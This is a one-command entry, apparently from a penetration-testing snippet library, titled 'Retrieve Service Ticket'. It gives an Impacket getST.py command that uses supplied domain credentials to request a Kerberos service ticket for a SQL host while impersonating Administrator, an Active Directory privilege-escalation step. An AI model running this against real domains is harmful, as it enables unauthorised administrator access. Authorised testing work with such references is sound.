---
id: d28af867-3e6b-4d4e-8972-63122ce9df74
name: Retrieve Service Ticket
type: command
executor: bash
data: getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator
  -dc-ip 10.10.10.10
output: null
created_at: '2023-04-06T03:56:07.695237+00:00'
updated_at: '2023-04-10T20:26:26.278263+00:00'
---

# Retrieve Service Ticket

```bash
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
```


